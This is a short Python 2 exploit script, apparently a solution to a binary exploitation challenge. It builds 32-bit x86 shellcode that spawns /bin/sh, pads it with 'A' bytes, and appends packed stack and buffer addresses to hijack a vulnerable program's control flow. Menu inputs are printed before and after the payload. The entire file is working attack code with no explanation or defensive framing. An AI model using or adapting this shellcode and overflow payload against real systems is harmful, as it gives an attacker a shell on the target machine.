from struct import pack

shellcode = ("\x6a\x0b\x71\x04AAAA\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80");

ebp = 0xbffe9978;

b = 0x80f3748;

print 1;

print shellcode + 'A'*(0x30 - 8 - len(shellcode)) + pack('<I', b+8) + pack('<I', ebp+4);

print 3;
